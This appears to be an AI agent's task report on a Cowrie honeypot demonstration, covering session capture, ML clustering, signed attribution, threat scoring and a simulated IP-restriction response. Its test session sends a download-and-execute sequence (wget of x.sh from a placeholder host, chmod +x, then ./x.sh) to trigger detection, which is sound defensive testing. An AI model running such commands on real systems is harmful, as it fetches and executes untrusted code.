| **Session ID** | **`42ee73a7cbbd`** (not one of the 7 previously excluded IDs; now registered in exclusions v2.0.0) |
| Cowrie log baseline | **21,888 lines** in `cowrie.json`, counted twice (07:03:40Z and 07:03:47Z): stable |
| Relay record baseline | **11 records** in `cowrie/attributing_relay/records/relay_mapping.jsonl`, counted twice: stable (SHA-256 before `496b5a0f…26ee`) |
| Pre-session time T0 | `2026-11-12T07:03:56.912457Z` |
| Client | `cowrie-demo-test-client`, 10.250.25.3:47200 → relay demo listener 10.250.25.2:2222. The control client was not used |
| Client result | connected and authenticated (`demo`); 4 lines sent; 838 output bytes; no error; finished 07:04:10Z |

**Session command:**
```
docker exec cowrie-demo-test-client /cowrie/cowrie-env/bin/python3 /opt/demo/demo_client.py shell --host 10.250.25.2 --port 2222 \
  --line "uname -a" --line "wget http://files.example/x.sh -O x.sh" --line "chmod +x x.sh" --line "./x.sh"
```

**Live orchestration command** (from the repository root; Git Bash prefix `MSYS_NO_PATHCONV=1`):
```
python reports/academic_demo_readiness_20261112/demo_orchestrator.py live --ml-only --cowrie-baseline 21888 \
  --cowrie-rotated-to cowrie.json.2026-11-11 --relay-baseline 11 --not-before 2026-11-12T07:03:56.912457Z --approved
```

## 13.2 Pre-execution safety confirmation

All conditions were confirmed before the session was generated, after reviewing `print-live-commands` and the code.

| Condition | Confirmed by |
|---|---|
| Real relay public key used only for relay-record verification | With `--ml-only`, `rules_branch` (the DEMO result and approval signing) is not called. The public key (`a52b8c52…d272bf`) is used only by `client_attribution.records.verify_records` in `relay_test_client_check` |
| Test client only | the session command targets `cowrie-demo-test-client` only. The new relay records name only 10.250.25.3 (checked) |
| `--raw-input` used | `pipeline.py --skip-attack --raw-input <slice>`, so `collect = False` |
| No historical log copied | `collect_logs.py` did not run. Only lines after the boundary left the container (see 13.3) |
| No production private key, trust config or witness | the host audit hook found no access to `configs/`, `secrets/`, the Cowrie log, Dataset V2 or sealed data. No witness container exists (`docker ps -a`) |
| No enforcement | no response code ran in ML-only mode. `DisabledRelayEnforcement` was not even constructed |

## 13.3 Evidence: only newly appended Cowrie events were processed

**Cowrie's daily log rotation happened between the baseline and the slice.** The fresh session was the first Cowrie write on 12 November (UTC). Cowrie therefore renamed `cowrie.json` to `cowrie.json.2026-11-11` and started a new `cowrie.json`.
- **First live attempt** (run `20261112T070425Z-47e7d1`): it correctly **failed** the slice check (the log had 14 lines, against a baseline of 21,888) and stopped before writing any file.
- **Read-only checks inside the container** (names, sizes and line counts only):
  - `cowrie.json.2026-11-11` holds exactly **21,888** lines, last modified 2026-11-11T17:19:54Z, before T0. Nothing was appended to the historical log after the baseline.
  - The new `cowrie.json` holds **14** lines from one session, `42ee73a7cbbd`, between 07:03:59.68Z and 07:04:10.28Z.
- **Fix in live mode:** I added `--cowrie-rotated-to`. With it, live mode only **counts** the rotated file inside the container and requires the count to equal the baseline and the file to predate T0. It then reads the new log from line 0. No historical line is copied or processed.

**Live checks (all passed):**
- the rotated log still holds exactly the baseline lines and predates the session;
- the slice is exactly the appended lines: **14 events**, indices 0–13 of the new log;
- the slice holds exactly one session, which is not excluded;
- no event is earlier than T0;
- the relay log grew from 11 to 13 records;
- the relay records verify with the real relay **public** key (chain and signatures);
- the 2 new records (`connection_open` and `connection_close`, seq 12–13, connection `93daae7d…`) name only the test client;
- Cowrie `src_port` 50408 matches the relay's `upstream_local_port` 50408, so the session maps to 10.250.25.3;
- the only command against `cowrie-project` was the read-only slice `docker exec`.

**Event types in the slice:** `session.connect`, `client.version`, `client.kex`, `login.success`, `client.size`, `session.params`, `command.input`, `command.failed`, `log.closed`, `session.closed`.

**Hashes:** the SHA-256 of the raw slice stream is `491558f8…ac8c`. The stored slice `artifacts/raw/cowrie_slice.json` is `50c0f942…5aa1` (re-serialised JSON lines).

## 13.4 Results (fresh session `42ee73a7cbbd`)

| Stage | Result |
|---|---|
| Session reconstruction (`parse_logs.py`, working tree `4987a671…`) | 1 session. Source 172.22.0.2:50408 → 172.22.0.1:2222, ssh, `auth_success = 1`, duration 10.60 s. Commands: `uname -a`, `wget http://files.example/x.sh -O x.sh`, `chmod +x x.sh`, `./x.sh`, `exit` |
| Feature extraction (`extract_features.py` V1, working tree `6524aedf…`) | 1 row, 29 columns. Includes `dur` 10.600798, `spkts` 5, `dpkts` 7, `sbytes` 69, `dbytes` 820, `rate` 83.86, `tcprtt` 0.0859, `ackdat` 4.233; `attack_cat` `normal`, `label` 0 (V1 defaults) |
| DEC clustering (saved artifacts, no refit; artifacts dated 2026-09-08 and unchanged) | **cluster 1, confidence 0.924** (cluster probabilities 0.047 / **0.924** / 0.029) |
| Pattern analysis (approved five-session baseline) | Input: `data/processed/dec_results.csv`, `session_mapping.csv`, `model_input.csv` and `data/parsed/session_details.json` (unchanged since 2026-10-19). All 5 baseline sessions are in cluster 1 (100%) |
| Signature generation | 1 signature, **`sig-4e22763125d03876`** (cluster 1, 5 sessions, confidence 0.8375, label Mixed/Unclassified); no warnings |
| Novelty assessment | **Known-like**: closest `sig-4e22763125d03876`, score **0.774** (distance 0.226) against the unchanged known threshold 0.70. 8 comparable features. Observed command categories: reconnaissance, file_system, file_transfer, networking. Mode `independent`; 0 overlap with the 5 reference sessions |

**Fresh session compared with the 29B synthetic rehearsal:** DEC gave cluster 1 in both (0.924 fresh, 0.913 synthetic). Novelty was Known-like in both (0.774 fresh, 0.786 synthetic).

## 13.5 Output locations and SHA-256
- **Evidence folder:** `reports/academic_demo_readiness_20261112/live/20261112T070531Z-670781/`. It holds `run_summary.json`, `opened_files_host.json`, `exclusion_tests_29c.txt` and `artifacts/` (raw slice, pipeline, behaviour analysis, signatures, novelty). It also has its own `SHA256SUMS` covering 25 files; all verify.
- **Temporary work:** the run wrote only to `cowrie/assessment_work/output/demo-20261112T070531Z-670781/`. It was copied to the evidence folder and then removed. Both work folders are empty.

| File | SHA-256 |
|---|---|
| `artifacts/raw/cowrie_slice.json` | `50c0f94232e9d7b1f5fc933e57bdd9ef6df1bcd35cf29f7405528788aa995650` |
| `artifacts/ml/pipeline/parsed/sessions.json` | `9c6b316491eae03da794f0fc1841d6143844d1b346d7d2c89fdab578de770d3f` |
| `artifacts/ml/pipeline/parsed/session_details.json` | `ba2993d0c8fae232329574642fd834973b54951d6628dab50e9961bf22e025f2` |
| `artifacts/ml/pipeline/parsed/behavior_features.csv` | `2564e5c13f382beda5c2cd57ee7a9af2c47e36d62092ec1b686737be75fb2e63` |
| `artifacts/ml/pipeline/processed/dec_results.csv` | `3f31b5c5756dfa2fd5077f9a0a99a01fa93c1c129bf2c7d02c5b8aec3353077a` |
| `artifacts/ml/behaviour_signatures/behaviour_signatures.json` | `377c0a6c415d99f5ea760115973d8ff9848e61e2612b03313fd714c17cc4d84f` |
| `artifacts/ml/novelty/novelty_assessment_results.json` | `b04b9c657b25de922f1fadfb9db94989e61d34c6d52b0b0306a089c4a7c38c98` |
| `run_summary.json` | `cc083f5d630d963d678b992c2705193d572ebbb50bb9755adca6c33a7a290a29` |
| `scripts/parse_logs.py` (before = after) | `4987a671271450016ede8172230abd1ec49ded22a2190a71b471f577dbbaa414` |
| `scripts/extract_features.py` (before = after) | `6524aedf68d8aca4aacc30ab2531acdb52614ba63c9c374061fe1bd7203b653e` |

## 13.6 Session exclusion: new version and verification
- **New file `configs/session_exclusions_v2.json`** (version 2.0.0, SHA-256 `92015d64…2856`, canonical digest `2a50f53f…68ca5`). It keeps all 7 v1 entries unchanged and adds `42ee73a7cbbd` (category `demo`, "Task 29C live demonstration, test client shell").
- **`configs/session_exclusions_v1.json` is unchanged** (canonical digest `8136184b…`, 7 IDs; file hash checked before and after).
- **Making v2 effective:**
  - `session_exclusions.DEFAULT_PATH` now points to v2 (one line, plus its docstring). `dataset_builder/build_labelled_dataset.py` and `scripts/extract_features_v2.py` both call `load_exclusions()` with the default, so they now use v2. Neither file was edited.
  - `tests/test_trust_boundary.py`: the repository-exclusions test now asserts that v1 is exactly the seven and that the default (v2) is the seven plus `42ee73a7cbbd`. The per-session filter test also covers the new ID.
- **Verification:**

| Check | Result |
|---|---|
| default exclusions | v2.0.0, 8 IDs; v1 ⊂ v2 |
| `is_excluded("42ee73a7cbbd")` | true |
| dataset-builder filter | the session is dropped |
| evaluation guard `assert_none` | raises `ExclusionConfigError` |
| `extract_features_v2.extract` on a stub log carrying only the ID (no session content) | `sessions_excluded: ["42ee73a7cbbd"]` |
| exclusion tests | 20 passed |
| full suite | **822 passed** (821 before, plus 1 new parameter case) |

- **Demo script:** its built-in `EXCLUDED` set now includes the new ID, so a future demonstration run rejects it.
- **Evidence kept:** the session's demonstration evidence was not deleted, and the session was not reprocessed as a training or evaluation example.

## 13.7 Warnings, errors and deviations
1. **Log rotation (deviation, handled).** The first live attempt failed safely because of Cowrie's daily rotation and produced no artifacts. Live mode gained `--cowrie-rotated-to` with the checks in 13.3. **Recommendation:** for later live runs, check whether the first write of the day is still pending, and pass `--cowrie-rotated-to` if the log rotates.
2. **Demo-script changes (deviation, demo folder only).**
   - The existing `live` command also ran signing, scoring, response and feedback, which this task forbids. I therefore added `--ml-only` and `--not-before`.
   - The live slice checks are stricter: exactly the appended lines, exactly one session, and timestamps after T0.
   - Relay-record verification was added; it uses the public key only.
   - `print-live-commands` was updated.
   - After the changes, the synthetic rehearsal still passed all 31 checks (run `rehearsal/20261112T070250Z-b1d6f6`).
3. **Auxiliary MinMax scaler.** The existing pipeline step 5 fitted its auxiliary MinMax scaler on the single session. As a result, `model_input.csv` is all zeros, and `models/scaler.joblib` was written in the run's own output folder. The pipeline labels this step "not used by DEC". DEC read `behavior_features.csv` with its own saved StandardScaler, and the DEC artifacts are unchanged. **DEC was not refit.**
4. **One baseline signature.** All 5 baseline sessions fall in cluster 1, so there is exactly one signature, and "Known-like" means similar to that one cluster profile. This is a property of the small approved baseline, not of the fresh session.
5. **V1 label columns.** `attack_cat = normal` and `label = 0` in the V1 features are extractor defaults, not ground truth.
6. **Comment drift.** `dataset_builder/build_labelled_dataset.py` still has a comment naming `session_exclusions_v1.json`. Its behaviour follows the default (v2), and the comment was not edited.
7. **Client warning (benign).** The demo client printed Twisted `CryptographyDeprecationWarning` (TripleDES) messages.
8. **Live state.** The relay log now has 13 records and Cowrie's new `cowrie.json` has 14 lines. Neither was modified by me. Services show 0 restarts and unchanged start times.

## 13.8 Not done, as instructed
Signed attribution, threat scoring, dry-run response and feedback for `42ee73a7cbbd` have **not** been run. They wait for your review of these ML results. **Note for that step:** the demo script's `EXCLUDED` set now contains `42ee73a7cbbd`, so the same live command without `--ml-only` would correctly **refuse** this session. If you approve the rules branch for this already-registered demonstration session, it needs a small, explicit opt-in. For example, a `--registered-demo-session 42ee73a7cbbd` flag would accept that one ID only when it is in exclusions v2.0.0 with category `demo`. That run would use the DEMO result and approver keys, and only the real relay public key for record verification. Not implemented; awaiting your decision.

Stopped.

---

# Task 29D — Fresh session: signed attribution and threat assessment (2026-11-12)

> **ACTUAL FRESH-SESSION RESULTS** for session **`42ee73a7cbbd`** (captured in Task 29C), run `20261112T072217Z-034f7b`.
> These are not the Task 29B synthetic results.

**Status:** **all 27 checks passed.**
- **Rules branch:** Cowrie events → behavioural evidence → signed attribution → threat scoring and rules. It **stopped before response and feedback**.
- **Tier:** **propose**, produced by the unchanged assessor (all 8 gates true). The proposal is dry-run, with approval pending and nothing executed.
- **Not done:** no new network session, no control-client use, no enforcement, no witness, no M0–M8 or A1, no model refit, no threshold or definition change, nothing committed.

**Invocation** (repository root; Git Bash prefix `MSYS_NO_PATHCONV=1`):
```
python reports/academic_demo_readiness_20261112/demo_orchestrator.py assess --approved \
  --evidence-run 20261112T070531Z-670781 --demo-session-exception 42ee73a7cbbd
```

## 14.1 Input: the captured evidence, not a new read
- **Cowrie events:** the input is the Task 29C captured slice `live/20261112T070531Z-670781/artifacts/raw/cowrie_slice.json` (SHA-256 `50c0f942…5aa1`). Its hash was checked against that run's `SHA256SUMS`. It holds 14 events, all from `42ee73a7cbbd`.
  - The live Cowrie log was **not** read again: no command touched `cowrie-project` (checked).
  - The events file given to the container is byte-identical: its hash is also `50c0f942…`.
- **Relay records:** the real relay log was read whole (13 records, SHA-256 `32542a28…2dc6`) for chain verification. It was not modified.
- **ML branch:** not repeated.

## 14.2 Demonstration-only exclusion exception
**Implementation** (in `demo_orchestrator.py` only):
- `DEMO_EXCEPTION_SID = "42ee73a7cbbd"` is hard-coded.
- `demo_session_exception()` is reachable only from the `assess` mode, through `--demo-session-exception`.

**Scope:** behavioural evidence extraction, the demo-signed attribution, and threat assessment. Dry-run response and feedback only after separate approval.

**The exception requires and enforces all of the following:**

| # | Requirement | How it is enforced |
|---|---|---|
| 1 | Matches only `42ee73a7cbbd` | any other requested ID is refused |
| 2 | Explicit demo-mode invocation | without the flag, the run is refused ("no demonstration exception requested"). The flag is refused in `live` and `rehearse` modes. `--approved` is also required |
| 3 | Session registered as a demo session in the global exclusions | checked with a read-only `load_exclusions()` lookup of v2.0.0, category `demo` |
| 4 | Never modifies the global exclusion configuration | the exclusions file is only read. Its hash `92015d64…2856` is checked before and after the run, and the session is still excluded afterwards (checked) |
| 5 | Does not affect dataset builders, training, validation or evaluation | nothing outside the demo script changed. `session_exclusions`, `dataset_builder` and `extract_features_v2` are untouched by this task |
| 6 | Rejects every other excluded session | a self-test in the run made 22 refusal attempts: each of the 7 other excluded IDs with three different requests, plus a wrong ID for this session. All were refused. Refusal was also confirmed from the command line before the run (no flag, wrong ID `3eede5e19e25`, and the flag in `live` mode) |
| 7 | Recorded | in the run manifest (`run_summary.json` → `demo_session_exception`) and in this report |

## 14.3 Verified relay attribution evidence (real relay public key)
- **Chain and signatures:** all 13 relay records verify (`chain and signatures verify`) with the real relay **public** key, pin `a52b8c52…d272bf`. Only the public key was read; no private key was opened.
- **New records since the 29C baseline of 11:** seq 12 `connection_open` and seq 13 `connection_close`, connection `93daae7d-64df-4314-bcc9-f42f74789d27`. Both name client **10.250.25.3:47200** only. The control client is absent.
- **Session link:** Cowrie `src_port` 50408 equals the relay `upstream_local_port` 50408.

## 14.4 DEMO signature creation and verification
- **Signing key:** a temporary in-memory Ed25519 attribution-result key, SHA-256 `4dc88673…95a7` (key ID `4dc886739996a75f`), labelled DEMO ONLY. It was never written; only its public key was written. It is distinct from the relay key (checked). No approver key was generated in this task.
- **Signed result:**

| Field | Value |
|---|---|
| `result_id` | `DEMO-20261112T072217Z-034f7b` |
| issued | 07:22:16.117Z |
| valid until | 08:22:16.117Z |
| `result_hash` | `dd1fc570…46fcd` |
| file SHA-256 | `11c8ba1c…0bb95` |

- **Verification:**
  - **In process:** `threat_assessment.signed_attribution.verify_result` with the DEMO public key accepted it.
  - **In the isolated container:** the result was accepted (1 accepted, 0 rejected).
  - **Altered copy** (client IP changed to 10.250.25.4): rejected with `result_hash mismatch (result modified)`, and no proposal.
  - **Unsigned correlation:** rejected with `unsigned attribution result`, and no proposal.
- **Signed entry against the captured evidence: 16 of 16 fields match.**

| Field | Signed value = evidence |
|---|---|
| session ID | `42ee73a7cbbd` |
| client address (relay open record) | 10.250.25.3:47200, the test client |
| source attribution decision | `attributable_via_proxy_mapping`, close check `consistent` |
| relay→Cowrie tuple (Cowrie connect and relay upstream) | 172.22.0.2:50408 |
| connection ID (signed, open, close) | `93daae7d…` |
| relay record hashes (open, close) | `c96d4c95…013d`, `0cab24ea…c9f5` |
| relay accepted / upstream connected / closed | 07:03:59.300090Z / 07:03:59.472172Z / 07:04:10.291870Z |
| Cowrie connect / closed | 07:03:59.679666Z / 07:04:10.280464Z |
| login success time and state | 07:04:00.059688Z, `login_success_observed` |

## 14.5 Behavioural evidence (catalogue `v2-evidence-1.1`, calibration `train-20261110`, unchanged)
**Session summary:** evidence level **E2**, status `interpreted`. 4 input lines; duration 10.5 s; mean gap between inputs 1.48 s (maximum 1.65 s).

| Indicator | Kind | Evidence class | Matched line(s) | Stated limitation |
|---|---|---|---|---|
| XFER-1 | **action** | directly observed | `wget http://files.example/x.sh -O x.sh` | attempt only; success needs a `file_download` event |
| EXEC-1 | **action** | inferred | `chmod +x x.sh`, `./x.sh` | links two typed commands; does not show the file existed or ran |
| SHELL-1 | context | directly observed | `uname -a` (4 lines) | commands were issued; not what they did |
| DISC-1 | context | directly observed | `uname -a` | ordinary administration uses the same commands |
| EMU-1 | caveat | emulator dependent | — | a property of Cowrie, not of the client |

**Interpretations (both E2):**
- "download attempt": **severity S2**, requires XFER-1.
- "download-and-execute attempt": **severity S3**, requires XFER-1 and EXEC-1; file `x.sh`.
- In both, the outcome is `not_observed` for XFER-1 and EXEC-1, and `success_observed` is false. The findings record attempts only.

**Authentication:** the evidence engine's own status is `indeterminate:shared_source`, because the source is the relay. This is expected; login is established through the signed result (14.6).

## 14.6 Successful-login evidence
- **Assessor:** `authentication_evidence.state = login_success_observed`, `event_observed: true`, source = signed attribution result `DEMO-20261112T072217Z-034f7b`. Basis: *"cowrie.login.success at 2026-11-12T07:04:00.059688Z correlated by session ID (signed result …)"*.
- **Captured event:** this matches the actual `cowrie.login.success` event in the captured slice: user `demo`, exactly one success, 0 failures.

## 14.7 Threat assessment (isolated container, DEMO configuration)
**Container:** compose profile `assessment`, `network_mode: none`. The isolation self-check passed. The container loaded only the 7 DEMO inputs from `/work/input`.
- **Configuration consistency checks, all true:**
  - the policy pins the attribution digest;
  - the policy and the attribution config pin the same address-safety digest;
  - the evidence relays cover the attribution relays;
  - the internal networks match;
  - the authentication rule is approved.
- **Versions:** assessment `threat-assessment-1.2.0`; policy `2.2.0-DEMO` (conditions identical to 2.2.0); attribution config `3.0.0-DEMO`.

| Gate | Result |
|---|---|
| 1 severity S2 or higher | **true** (S2 and S3 findings) |
| 2 interpretation E2 or higher on an S2+ finding | **true** |
| 3 two distinct action indicators | **true** (EXEC-1, XFER-1) |
| 4 successful login | **true** (signed `cowrie.login.success` correlation) |
| 5 attributable source | **true**: `attributable_via_proxy_mapping`; subject **10.250.25.3**, not the relay 172.22.0.2 |
| 6 not protected or shared | **true**: 10.250.25.3 is on the DEMO allowlist and is neither protected nor shared. The control client 10.250.25.4 stays excluded, and the relay subnet stays protected. Lists are identical to `address_safety_v1.json` |
| 7 verified configuration digests | **true** |
| 8 no processing errors | **true** (none) |

**Tier: `propose`.** Reason: "all proposal conditions met; manual approval required". Caveat annotation: EMU-1.

**Proposed action (recorded only):** `block_source_ip` 10.250.25.3, scope "this sensor only", mode `dry_run`, TTL 86,400 s, inverse `unblock_source_ip`, `manual_approval: pending`, `execution: not_executed`, relay connection `93daae7d…`.

## 14.8 Input and output hashes (SHA-256)
Evidence folder: `reports/academic_demo_readiness_20261112/assessment/20261112T072217Z-034f7b/`. It has its own `SHA256SUMS` covering 17 files; all verify.

| File | SHA-256 |
|---|---|
| input: captured Cowrie slice (= container events file) | `50c0f94232e9d7b1f5fc933e57bdd9ef6df1bcd35cf29f7405528788aa995650` |
| input: real relay log (13 records, read only) | `32542a289c5798586f5c5c530d9d110c1802a32e14eece0cafa0848242582dc6` |
| input: real relay public key | `ec26c9fcca74befc2858e51a396a0a4b9cdfb8d663b5acd456f13eba7256231f` |
| input: `threat_attribution_v3_DEMO` | `1ba71bcd6af3b9cbd74ced2873a8ffbe704a28a67c3ba103de18b7baa4a96c38` |
| input: `defence_policy_v2_2_DEMO` | `d6b08aea50f166eb26aef32da9f63039b791a2535d5c3bf68ce7e4c0f83147a9` |
| input: `address_safety_DEMO` | `c85672377621409c7576444957658c5eef1de53cfa811b5b9eef3ce41fe30f29` |
| input: DEMO result public key | `094fc66bd3a081f838ab2a64a4b9eb491ad06033913aa8ee058529c8253b61be` |
| signed result (DEMO) | `11c8ba1c2de94bd3bba7667695e7bbe36c1070abd19dcd9920a33f49f940bb95` |
| output: `evidence.jsonl` | `c0193ba3fccdcf426c6b18e78c700709efb3a1fced2b86f64c45c370ae278b9d` |
| output: `assessments.jsonl` | `f548e737b66ae6611f34f02653d9ce0f4e7de692ab6506aedc36f3d672f55338` |
| output: `audit.jsonl` (hash chain verifies) | `ed280360e74a2b34b3d38797d86fc8b27bbb313d86b966bd922fa87c0c83deba` |
| output: `summary.json` | `7a39c723ebc7a143ce074d9ddbda17279508431d0011fd9cf2bd5cbc56f08482` |
| `run_summary.json` (manifest) | `39d101f0c12a6c0bde5105547ce50f6d55d6b01a58bc60c7a3e0818df3ae93a9` |
| `scripts/parse_logs.py` / `scripts/extract_features.py` (before = after) | `4987a671…a414` / `6524aedf…653e` |

## 14.9 Evidence that production configuration and keys were not used
- **Host process:** the audit hook (`opened_files_host.json`) shows no file under `configs/` other than the read-only exclusions lookup `configs/session_exclusions_v2.json`. It also shows no `secrets/`, no Cowrie log, and no Dataset V2 or sealed path.
- **Container, assessment phase:** only the DEMO inputs in `/work/input` and its own outputs. **0** production configs.
  - The isolation self-check separately scanned 64 repository files byte by byte for private-key material. This is the existing safety scan; `secrets/` is not mounted.
- **Signing:** the attribution result was signed only by the temporary DEMO key. The real relay key was used only as a **public** key, for record verification.
- **Witness:** no witness or production witness was used, and no witness container exists.
- **Work folders:** cleanup removed the run's 8 input files and its output folder. Both work folders are empty.
- **Services:** 0 restarts and unchanged start times.

## 14.10 Global exclusions remain active
- `configs/session_exclusions_v2.json` is unchanged: SHA-256 `92015d64…2856`, version 2.0.0, canonical digest `2a50f53f…68ca5`, 8 IDs.
- `load_exclusions().is_excluded("42ee73a7cbbd")` is **true** after the run (checked).
- v1 is unchanged (`cd3b7648…`).
- The exception exists only inside the demo script's `assess` mode. Dataset construction, training, validation, evaluation and benchmark code paths still drop the session (verified in 29C, 13.6; this task changed none of them).

## 14.11 Test results
- **Full suite:** **822 passed**, 0 failed (`assessment/…/full_test_suite_29d.txt`).
- **Regression rehearsal** after the script changes: synthetic run `rehearsal/20261112T072037Z-d187b6`, **35 of 35** checks passed (it now includes the in-process verification and evidence-match checks).

## 14.12 Changes and notes
1. **Demo script** (report folder only). Added:
   - the `assess` mode and the single-ID exception;
   - `stop_after_assessment` in `rules_branch`, so no approver key, response or feedback in this mode;
   - in-process DEMO-signature verification and a signer-identity check;
   - the 16-field evidence-match table.

   For real data, the tier check now records whatever the assessor produces, and requires only that the tier is `propose` exactly when all gates are true and a proposal exists. It does not require `propose`; that expectation stays for the synthetic rehearsal only. No project code was changed.
2. **Cache folder.** A `__pycache__/demo_orchestrator.cpython-311.pyc` folder created by my compile checks in the report folder was removed.
3. **Interpretation outcomes.** The interpretations report `not_observed` outcomes for XFER-1 and EXEC-1. The Task 29B synthetic fixture had shown `observed_failure` for EXEC-1. This difference comes from the real Cowrie events, and the assessor was not changed.
4. **Proposal lifetime.** The DEMO-signed result is valid until 08:22:16Z, and the proposal's 30-minute window for later response intake is counted from the response step. A later dry-run response task should re-run `assess` to get a fresh DEMO-signed result rather than reuse this one.

Stopped after signed attribution and threat assessment. Response and feedback have **not** been run.

---

# Task 29E — Dynamic response and feedback demonstration (2026-11-12)

> **Every response outcome in this section is SIMULATED (dry-run).**
> - No firewall rule was created and no IP was blocked.
> - No traffic was altered, and the test client was not restricted.
> - The relay boundary was never contacted.
>
> Session **`42ee73a7cbbd`** (the Task 29C fresh session) was processed in run **`20261112T073151Z-ba1005`**.

**Status: all 51 checks passed.**
- **Stages:** the threat assessment was refreshed, then the response went through validation, simulated execution, operator verification, simulated rollback and feedback.
- **Not done:** no new network session, no enforcement, no witness, no D0 or M0–M8, no production keys, no model refit, nothing committed.

**Invocation** (repository root; Git Bash prefix `MSYS_NO_PATHCONV=1`):
```
python reports/academic_demo_readiness_20261112/demo_orchestrator.py assess --approved \
  --evidence-run 20261112T070531Z-670781 --demo-session-exception 42ee73a7cbbd --with-response
```
`--with-response` is accepted in `assess` mode only. Without it, `assess` stops after threat assessment, as in Task 29D.

## 15.1 Refreshed threat assessment (the Task 29D result had expired)
- **Inputs:** the same captured slice (hash-checked against the Task 29C manifest, `50c0f942…`) and the real relay log (13 records, verified with the real relay public key).
  - The demonstration exception (§14.2) applied unchanged. Exclusions v2 is unchanged (`92015d64…`), and the session is still excluded after the run (checked).
- **Fresh DEMO-signed result:**

| Field | Value |
|---|---|
| `result_id` | **`DEMO-20261112T073151Z-ba1005`** |
| `result_hash` | `6d449820a76b143af58c27da434c33b3c71b46ec908d50743363eee2b31b90d8` |
| signer | temporary DEMO result key `aabbbc64…d734` |
| issued | 07:31:50.067Z |
| valid until | **08:31:50.067Z** |

- **Verification:**
  - in process with the DEMO public key: valid;
  - in the isolated container: accepted (1 accepted, 0 rejected);
  - **unexpired at response time** (checked before continuing);
  - 16 of 16 fields match the captured evidence;
  - altered and unsigned copies are rejected.
- **Outcome:** the unchanged assessor again produced **`propose`** with all 8 gates true, subject 10.250.25.3. It is an eligible proposal, so the run continued.

## 15.2 Response validation (the existing `ResponseController` with the isolated DEMO response policy)
**DEMO response policy:** version `1.0.0-DEMO`; `mode: dry_run`; `enforcement_activated: false`; action `restrict_new_connections` on listener `demo`; maximum TTL 900 s; proposal validity 1,800 s. It has one temporary DEMO approver, key `e8ac9dc6…6baf0` (key ID `e8ac9dc6430f0301`), which is distinct from the result and relay keys. The production `configs/response_policy_v1.json` was not read.

| Validation | Result |
|---|---|
| Proposal | **`prop-task26c-isolated-000001`**, proposal_hash `7b1c8307…0648` (recomputes; integrity verified) |
| Exact action | the assessor's proposed action is **`block_source_ip`** with subject **`10.250.25.3`** (kept in `source_proposal`). The controller converts it to its single permitted response action, `restrict_new_connections`, on the demo listener |
| Exact target | **`10.250.25.3/32`** |
| Attribution verification | the proposal is bound to the accepted signed result `DEMO-20261112T073151Z-ba1005`, relay connection `93daae7d…`, and the assessment audit record `task26c-isolated-000001` (`a1ce3cd5…`) |
| Target allowlisting | only `10.250.25.3/32` is accepted. Refused: `10.250.25.4/32` (enforcement-excluded control client); `172.22.0.2/32` and `10.250.25.2/32` (protected); `10.250.25.0/28` (exactly one /32 allowed); `8.8.8.8/32` (not on the allowlist) |
| Maximum duration | the proposal maximum is **900 s (15 min)**, capped from the assessor's 86,400 s. A **901 s** approval was refused: "approved duration exceeds the proposal maximum" |
| DEMO approver signature | the valid approval `appr-65ee4e38-…` (approval_hash `ab7977c3…1393`) was **accepted**. Refused: one signed by an unregistered key ("approval signature invalid"), one modified after signing ("approval_hash mismatch"), one re-signed with target 10.250.25.4 ("approved target differs from the proposal"), and one referring to an altered proposal ("approval does not refer to this exact proposal") |
| Approval validity | refused: a decision dated in the future. Accepted rule `rule-37638088-…`: TTL **600 s**, from 07:31:55.706Z to 07:41:55.706Z, and unexpired at execution |
| Duplicate and replay prevention | refused: a second intake ("duplicate proposal"), a replayed approval ("replayed approval document"), a second execution ("duplicate or invalid execution"), a replayed verification ("replayed verification record"), and `enforce` mode ("enforcement_not_activated") |

**State after the invalid approvals:** the 6 invalid approvals were submitted first, to the same controller. Each was refused and logged as `operation_rejected`, and the proposal stayed `proposed` until the valid approval.

## 15.3 Dry-run lifecycle (SIMULATED)

| Step | Response audit event (sequence) | Result |
|---|---|---|
| 1 Valid proposal | `proposal_created` (1) | `proposed` |
| 2 Human approval (DEMO key) | `approval_recorded` (9) | `approved`; signature verified |
| 3 Controller validation | execute-time checks: target re-validated, rule window, fingerprints unchanged; `enforce` mode refused (10–11) | passed |
| 4 **Simulated** restriction | `simulated` (12): `enforced: false`, "dry-run: no rule staged, relay not contacted" | `simulated` |
| 5 Operator verification | `verification_passed` (14): outcome `dry_run_confirmed_no_effect` (no restriction observed, control unaffected) | `verified_dry_run` |
| 6 **Simulated** rollback | `revoked` (16) → `rollback_started` (17, `simulated: true`, `relay_contacted: false`) → `rollback_verified` (18) | `rolled_back` |
| 7 Final status | `annotation_recorded` (19) | **`rolled_back` (SIMULATED)**; response_success true |

**The response audit log has 19 entries:**
- 8 state events;
- 11 `operation_rejected` entries (6 invalid approvals, the duplicate intake, the replayed approval, the `enforce` attempt, the duplicate execution and the replayed verification);
- 1 annotation.

`verify_response_log`: "chain and transitions intact"; last hash `faa37213…cd45`.

## 15.4 Evidence that enforcement was never called and traffic was not altered
- **Relay boundary:** the controller was given `SpyDisabledEnforcement`, the unchanged `DisabledRelayEnforcement` with each call recorded before it raises. Recorded calls: **`[]`**, and `enabled` stayed false.
- **Enforce mode:** refused by the controller (`enforcement_not_activated`).
- **Subprocesses:** this run started **exactly one**: `docker compose … --profile assessment run --rm -T` for the assessment container (`network_mode: none`).
  - No `iptables`, firewall, relay or `docker exec` command was run, and nothing touched `cowrie-project` or the demo clients.
  - No network session was generated: the relay log is unchanged (13 records, `32542a28…`).
- **Services:** 0 restarts and unchanged start times (Cowrie, relay, both demo clients).

## 15.5 Feedback record (existing feedback implementation)
- **Annotation:** `dynamic_response.feedback.annotate`, label `true_positive`, operator "DEMO REVIEWER". It is stored as response audit entry 19 (`record_hash faa3721337e9cb86473166ecfc876949dcbaa541ebbbd27e0c4769626b33cd45`). Its note gives the session ID, the result ID and the feedback core hash.
- **`feedback_record.json`:** SHA-256 **`cea0f2739c80cf465e72fc537a06431325ba18bc6a6b2321e85e6a511214e421`**. The canonical core it contains has SHA-256 `e794b3679d0b5cdb4bcb4029cac3ac918c838bd3e7a2eab00c88e17693f1bf2a`.

| Reference | Value |
|---|---|
| original session | `42ee73a7cbbd` |
| threat assessment | tier `propose`, all gates true; assessment record `task26c-isolated-000001` / `a1ce3cd5…`; signed result `DEMO-20261112T073151Z-ba1005` / `6d449820…` |
| response proposal | `prop-task26c-isolated-000001` / `7b1c8307…`; target `10.250.25.3/32` |
| approval decision | `approve`, `appr-65ee4e38-…`, approver key `e8ac9dc6430f0301`, rule `rule-37638088-…`, TTL 600 s; audit record `5e139b41…` |
| **simulated** response | `simulated`, `enforced: false`; audit record `03bf3223…` |
